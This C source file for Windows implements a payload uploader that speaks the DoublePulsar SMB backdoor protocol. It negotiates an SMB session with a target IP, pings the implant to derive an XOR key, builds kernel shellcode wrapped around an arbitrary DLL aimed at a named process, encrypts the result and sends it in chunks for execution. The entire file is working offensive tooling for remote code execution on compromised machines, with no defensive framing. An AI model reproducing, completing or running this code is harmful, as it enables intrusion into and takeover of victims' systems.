#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

extern void xor_buffer(uint8_t *buffer, size_t length, uint32_t key);

static int upload_send_all(SOCKET sock, const uint8_t *buffer, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        size_t remaining = length - sent;
        int amount = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = send(sock, (const char *)buffer + sent, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        sent += (size_t)result;
    }

    return 0;
}

static int upload_recv_all(SOCKET sock, uint8_t *buffer, size_t length)
{
    size_t received = 0;

    while (received < length) {
        size_t remaining = length - received;
        int amount = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = recv(sock, (char *)buffer + received, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        received += (size_t)result;
    }

    return 0;
}

static int upload_recv_frame(SOCKET sock, uint8_t **frame, size_t *frame_length)
{
    uint8_t header[4];
    size_t body_length;
    uint8_t *buffer;

    *frame = NULL;
    *frame_length = 0;

    if (upload_recv_all(sock, header, sizeof(header)) != 0)
        return -1;

    body_length = ((size_t)header[1] << 16) |
                  ((size_t)header[2] << 8) |
                  (size_t)header[3];
    if (body_length > SIZE_MAX - sizeof(header))
        return -1;

    buffer = (uint8_t *)malloc(sizeof(header) + body_length);
    if (buffer == NULL)
        return -1;

    memcpy(buffer, header, sizeof(header));
    if (body_length != 0 &&
        upload_recv_all(sock, buffer + sizeof(header), body_length) != 0) {
        free(buffer);
        return -1;
    }

    *frame = buffer;
    *frame_length = sizeof(header) + body_length;
    return 0;
}

static void upload_put_le16(uint8_t *destination, uint16_t value)
{
    destination[0] = (uint8_t)(value & 0xffu);
    destination[1] = (uint8_t)((value >> 8) & 0xffu);
}

static void upload_put_le32(uint8_t *destination, uint32_t value)
{
    destination[0] = (uint8_t)(value & 0xffu);
    destination[1] = (uint8_t)((value >> 8) & 0xffu);
    destination[2] = (uint8_t)((value >> 16) & 0xffu);
    destination[3] = (uint8_t)((value >> 24) & 0xffu);
}

static uint32_t upload_get_le32(const uint8_t *source)
{
    return (uint32_t)source[0] |
           ((uint32_t)source[1] << 8) |
           ((uint32_t)source[2] << 16) |
           ((uint32_t)source[3] << 24);
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    WSADATA wsa_data;
    int wsa_started = 0;
    SOCKET sock = INVALID_SOCKET;
    HANDLE file = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    uint8_t *dll = NULL;
    uint8_t *payload = NULL;
    uint8_t *packet = NULL;
    uint8_t *response = NULL;
    size_t response_length = 0;
    size_t dll_length;
    size_t payload_length;
    size_t packet_capacity;
    size_t offset;
    uint16_t user_id;
    uint16_t tree_id;
    uint32_t key;
    uint32_t signature;
    uint32_t hash = 0;
    uint32_t total_value;
    size_t name_length;
    struct sockaddr_in address;
    int result = -1;
    DWORD bytes_read;
    uint8_t extra_byte;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535)
        return -1;

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        goto cleanup;
    wsa_started = 1;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
        goto cleanup;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1)
        goto cleanup;
    if (connect(sock, (const struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
        goto cleanup;

    file = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        goto cleanup;

    if (!GetFileSizeEx(file, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > (uint64_t)SIZE_MAX ||
        (uint64_t)file_size.QuadPart > UINT32_MAX)
        goto cleanup;

    dll_length = (size_t)file_size.QuadPart;
    if (dll_length == 0)
        goto cleanup;

    dll = (uint8_t *)malloc(dll_length);
    if (dll == NULL)
        goto cleanup;

    offset = 0;
    while (offset < dll_length) {
        size_t remaining = dll_length - offset;
        DWORD amount = remaining > (size_t)MAXDWORD ? MAXDWORD : (DWORD)remaining;
        if (!ReadFile(file, dll + offset, amount, &bytes_read, NULL) ||
            bytes_read == 0 || bytes_read > amount)
            goto cleanup;
        offset += (size_t)bytes_read;
    }
    if (!ReadFile(file, &extra_byte, 1, &bytes_read, NULL) || bytes_read != 0)
        goto cleanup;
    CloseHandle(file);
    file = INVALID_HANDLE_VALUE;

    if (sizeof(SMB_NEGOTIATE_PKT) <= 1 ||
        upload_send_all(sock, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT) - 1) != 0 ||
        upload_recv_frame(sock, &response, &response_length) != 0)
        goto cleanup;
    free(response);
    response = NULL;

    if (sizeof(SMB_SESSION_SETUP_PKT) <= 1 ||
        upload_send_all(sock, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT) - 1) != 0 ||
        upload_recv_frame(sock, &response, &response_length) != 0)
        goto cleanup;
    if (response_length < 34)
        goto cleanup;
    user_id = (uint16_t)response[32] | ((uint16_t)response[33] << 8);
    free(response);
    response = NULL;

    if (sizeof(SMB_TREE_CONNECT_PKT) <= 1)
        goto cleanup;
    {
        size_t tree_packet_length = sizeof(SMB_TREE_CONNECT_PKT) - 1;
        uint8_t *tree_packet = (uint8_t *)malloc(tree_packet_length);
        if (tree_packet == NULL)
            goto cleanup;
        memcpy(tree_packet, SMB_TREE_CONNECT_PKT, tree_packet_length);
        if (tree_packet_length < 34) {
            free(tree_packet);
            goto cleanup;
        }
        upload_put_le16(tree_packet + 32, user_id);
        if (upload_send_all(sock, tree_packet, tree_packet_length) != 0) {
            free(tree_packet);
            goto cleanup;
        }
        free(tree_packet);
    }
    if (upload_recv_frame(sock, &response, &response_length) != 0)
        goto cleanup;
    if (response_length < 30)
        goto cleanup;
    tree_id = (uint16_t)response[28] | ((uint16_t)response[29] << 8);
    free(response);
    response = NULL;

    if (sizeof(DP_PING_PKT) <= 1)
        goto cleanup;
    {
        size_t ping_length = sizeof(DP_PING_PKT) - 1;
        uint8_t *ping_packet = (uint8_t *)malloc(ping_length);
        if (ping_packet == NULL)
            goto cleanup;
        memcpy(ping_packet, DP_PING_PKT, ping_length);
        if (ping_length < 34) {
            free(ping_packet);
            goto cleanup;
        }
        upload_put_le16(ping_packet + 28, tree_id);
        upload_put_le16(ping_packet + 32, user_id);
        if (upload_send_all(sock, ping_packet, ping_length) != 0) {
            free(ping_packet);
            goto cleanup;
        }
        free(ping_packet);
    }
    if (upload_recv_frame(sock, &response, &response_length) != 0)
        goto cleanup;
    if ((size_t)SMB_RESP_SIGNATURE_START > response_length ||
        response_length - (size_t)SMB_RESP_SIGNATURE_START < 4)
        goto cleanup;
    signature = upload_get_le32(response + SMB_RESP_SIGNATURE_START);
    key = (uint32_t)(2u * signature) ^
          (uint32_t)((((signature >> 16) | (signature & 0x00ff0000u)) >> 8) |
                     (((signature << 16) | (signature & 0x0000ff00u)) << 8));
    free(response);
    response = NULL;

    if (dll_length > SIZE_MAX - (size_t)KERNEL_RUNDLL_SIZE)
        goto cleanup;
    payload_length = (size_t)KERNEL_RUNDLL_SIZE + dll_length;
    if (payload_length > UINT32_MAX ||
        dll_length > UINT32_MAX - 3978u ||
        (size_t)KERNEL_RUNDLL_TOTAL_OFFSET > payload_length ||
        payload_length - (size_t)KERNEL_RUNDLL_TOTAL_OFFSET < 4 ||
        (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET > payload_length ||
        payload_length - (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET < 4 ||
        (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET > payload_length ||
        payload_length - (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET < 4 ||
        (size_t)KERNEL_RUNDLL_HASH_OFFSET > payload_length ||
        payload_length - (size_t)KERNEL_RUNDLL_HASH_OFFSET < 4)
        goto cleanup;

    payload = (uint8_t *)malloc(payload_length);
    if (payload == NULL)
        goto cleanup;
    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, (size_t)KERNEL_RUNDLL_SIZE);
    memcpy(payload + (size_t)KERNEL_RUNDLL_SIZE, dll, dll_length);

    upload_put_le32(payload + KERNEL_RUNDLL_TOTAL_OFFSET,
                    (uint32_t)dll_length + 3978u);
    upload_put_le32(payload + KERNEL_RUNDLL_DLLSIZE_OFFSET, (uint32_t)dll_length);
    upload_put_le32(payload + KERNEL_RUNDLL_ORDINAL_OFFSET, 1u);

    name_length = strlen(TARGET_INJECT_PROCESS);
    for (offset = 0; offset < name_length; ++offset)
        hash = hash * 127u + (uint8_t)TARGET_INJECT_PROCESS[offset];
    upload_put_le32(payload + KERNEL_RUNDLL_HASH_OFFSET, hash);
    xor_buffer(payload, payload_length, key);

    if (SMB_EXEC_TEMPLATE_LEN != 70 ||
        sizeof(DP_EXEC_PKT) - 1 < (size_t)SMB_EXEC_TEMPLATE_LEN ||
        (size_t)SMB_NETBIOS_LEN_OFFSET + 3 > SMB_EXEC_TEMPLATE_LEN ||
        (size_t)SMB_EXEC_TOTAL_DATA_OFFSET + 2 > SMB_EXEC_TEMPLATE_LEN ||
        (size_t)SMB_EXEC_DATA_COUNT_OFFSET + 2 > SMB_EXEC_TEMPLATE_LEN ||
        (size_t)SMB_EXEC_BYTE_COUNT_OFFSET + 2 > SMB_EXEC_TEMPLATE_LEN ||
        (size_t)SMB_TID_OFFSET + 2 > SMB_EXEC_TEMPLATE_LEN ||
        (size_t)SMB_UID_OFFSET + 2 > SMB_EXEC_TEMPLATE_LEN ||
        payload_length > UINT32_MAX)
        goto cleanup;

    packet_capacity = (size_t)SMB_EXEC_TEMPLATE_LEN + 12u +
                     (size_t)SMB_EXEC_SHELLCODE_LEN;
    packet = (uint8_t *)malloc(packet_capacity);
    if (packet == NULL)
        goto cleanup;

    total_value = (uint32_t)payload_length;
    offset = 0;
    while (offset < payload_length) {
        size_t chunk_size = payload_length - offset;
        uint32_t parameters[3];
        size_t i;
        size_t packet_length;
        size_t netbios_length;

        if (chunk_size > (size_t)SMB_EXEC_SHELLCODE_LEN)
            chunk_size = (size_t)SMB_EXEC_SHELLCODE_LEN;
        if (chunk_size > UINT16_MAX || chunk_size > UINT32_MAX ||
            chunk_size > SIZE_MAX - (size_t)SMB_EXEC_TEMPLATE_LEN - 12u)
            goto cleanup;

        memcpy(packet, DP_EXEC_PKT, (size_t)SMB_EXEC_TEMPLATE_LEN);
        parameters[0] = total_value ^ key;
        parameters[1] = (uint32_t)chunk_size ^ key;
        parameters[2] = (uint32_t)offset ^ key;
        for (i = 0; i < 3; ++i)
            upload_put_le32(packet + (size_t)SMB_EXEC_TEMPLATE_LEN + i * 4,
                            parameters[i]);
        memcpy(packet + (size_t)SMB_EXEC_TEMPLATE_LEN + 12u,
               payload + offset, chunk_size);

        packet_length = (size_t)SMB_EXEC_TEMPLATE_LEN + 12u + chunk_size;
        netbios_length = packet_length - 4u;
        packet[SMB_NETBIOS_LEN_OFFSET] = (uint8_t)((netbios_length >> 16) & 0xffu);
        packet[SMB_NETBIOS_LEN_OFFSET + 1] = (uint8_t)((netbios_length >> 8) & 0xffu);
        packet[SMB_NETBIOS_LEN_OFFSET + 2] = (uint8_t)(netbios_length & 0xffu);
        upload_put_le16(packet + SMB_EXEC_TOTAL_DATA_OFFSET, (uint16_t)chunk_size);
        upload_put_le16(packet + SMB_EXEC_DATA_COUNT_OFFSET, (uint16_t)chunk_size);
        upload_put_le16(packet + SMB_EXEC_BYTE_COUNT_OFFSET,
                        (uint16_t)(chunk_size + 12u));
        upload_put_le16(packet + SMB_TID_OFFSET, tree_id);
        upload_put_le16(packet + SMB_UID_OFFSET, user_id);

        if (upload_send_all(sock, packet, packet_length) != 0 ||
            upload_recv_frame(sock, &response, &response_length) != 0)
            goto cleanup;

        if (offset + chunk_size == payload_length) {
            if ((size_t)DP_RESP_MUX_ID_OFFSET >= response_length ||
                response[DP_RESP_MUX_ID_OFFSET] != DP_MULTIPLEX_ID_EXEC)
                goto cleanup;
        }
        free(response);
        response = NULL;
        offset += chunk_size;
    }

    result = 0;

cleanup:
    if (response != NULL)
        free(response);
    if (packet != NULL)
        free(packet);
    if (payload != NULL)
        free(payload);
    if (dll != NULL)
        free(dll);
    if (file != INVALID_HANDLE_VALUE)
        CloseHandle(file);
    if (sock != INVALID_SOCKET)
        closesocket(sock);
    if (wsa_started)
        WSACleanup();
    return result;
}